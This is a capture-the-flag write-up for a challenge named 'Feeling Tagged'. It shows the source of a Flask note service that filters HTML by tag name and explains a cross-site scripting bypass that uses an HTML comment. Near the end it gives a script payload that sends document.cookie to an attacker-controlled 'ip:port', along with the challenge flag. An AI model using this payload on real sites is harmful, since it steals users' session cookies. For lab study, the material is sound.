# Feeling Tagged
> Check out my new note service! It supports all the formatting you'll ever need.

> Flag is in admin's cookies.

## About the Challenge
We are given a python file like the code below
```python
<?php
from flask import Flask, request, redirect
from bs4 import BeautifulSoup
import secrets
import base64

app = Flask(__name__)
SAFE_TAGS = ['i', 'b', 'p', 'br']

with open("home.html") as home:
    HOME_PAGE = home.read()

@app.route("/")
def home():
    return HOME_PAGE

@app.route("/add", methods=['POST'])
def add():
    contents = request.form.get('contents', "").encode()
    
    return redirect("/page?contents=" + base64.urlsafe_b64encode(contents).decode())

@app.route("/page")
def page():
    contents = base64.urlsafe_b64decode(request.args.get('contents', '')).decode()
    
    tree = BeautifulSoup(contents)
    for element in tree.find_all():
        if element.name not in SAFE_TAGS or len(element.attrs) > 0:
            return "This HTML looks sus."

    return f"<!DOCTYPE html><html><body>{str(tree)}</body></html>"
```
If you run the code, the code will create a web application about temporary HTML note service. There are 3 endpoints, `/`, `/add`, and `/page`. Endpoint `/` will return `HOME_PAGE` variable which contain the contain of the HTML file. The `/add` endpoint will encode the value from the from. And the `/page` will parses the input but there are some sanitization.
- Only `i p b br` tag HTML are allowed
- Cannot using any HTML that has an attribute

## How to Solve?
This challenge is about XSS and then send the payload to `nc redacted 10704` to get the admin cookie (The flag is stored in the admin cookie). To bypass the sanitization we gonna use the comment
```
<!--><script>window.location.replace("http:/ip:port/?cookie="+document.cookie);</script -->
```
After we send the URL to nc, we gonna retrieve the password
```
irisctf{security_by_option}
```